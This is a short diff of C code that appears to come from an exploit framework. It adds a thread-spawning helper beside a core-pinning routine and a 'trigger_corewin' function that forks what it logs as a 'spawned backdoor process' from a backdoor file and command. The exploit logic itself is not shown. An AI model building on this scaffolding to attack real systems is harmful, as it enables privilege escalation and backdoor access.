@@ -43,6 +43,14 @@ void thread_assign_to_core(int core_id) {
   log_success("Thread assigned to core %d", core_id);
 }
 
+pthread_t grazing(void (*f)()) {
+  pthread_t thread;
+
+  pthread_create(&thread, NULL, (void *(*)(void *))f, NULL);
+
+  return thread;
+}
+
 void trigger_corewin(const char *backdoor_file, const char *backdoor_cmd) {
   if (!SYSCHK(fork())) {
     log_info("spawned backdoor process");
